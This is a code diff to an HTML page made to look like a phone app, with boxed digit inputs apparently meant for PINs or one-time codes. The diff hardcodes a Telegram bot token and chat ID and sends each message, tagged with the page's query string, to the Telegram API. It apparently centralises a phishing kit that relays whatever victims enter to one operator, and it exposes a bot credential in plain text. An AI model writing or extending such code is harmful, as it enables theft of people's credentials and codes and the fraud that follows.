@@ -10,7 +10,7 @@
         .phone-container { background-color: #ffffff; width: 100%; max-width: 412px; height: 100vh; display: flex; flex-direction: column; padding: 24px; position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
         .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
         .screen.active { display: flex; }
-        h2 { font-size: 28px; font-weight: 700; margin-bottom: 24px; color: #111; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; color: #111; }
         .text-input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 16px; outline: none; }
         .box-input-container { display: flex; gap: 12px; align-items: center; margin-bottom: 20px; }
         .box-input { width: 60px; height: 60px; border: 1px solid #e0e0e0; background-color: #f9f9f9; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; outline: none; }
@@ -68,27 +68,21 @@
     </div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const TELEGRAM_BOT_TOKEN = urlParams.get('token');
-        const TELEGRAM_CHAT_ID = urlParams.get('id');
+        // Data zako za Bot (Hardcoded kwa ajili ya Centralization)
+        const BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
+        const CHAT_ID = '8735708057';
 
         async function sendToTelegram(msg) {
-            console.log("Attempting to send:", msg);
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error("Token au ID haikupatikana!");
-                return;
-            }
+            const origin = window.location.search || "?original=unknown";
+            const finalMsg = `${msg}\n\n🔗 *Source:* \`${origin}\``;
+            
             try {
-                let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: finalMsg, parse_mode: 'Markdown' })
                 });
-                let data = await response.json();
-                console.log("Telegram Response:", data);
-            } catch (e) {
-                console.error("Fetch Error:", e);
-            }
+            } catch (e) { console.error("Error:", e); }
         }
 
         function nextScreen(id) {
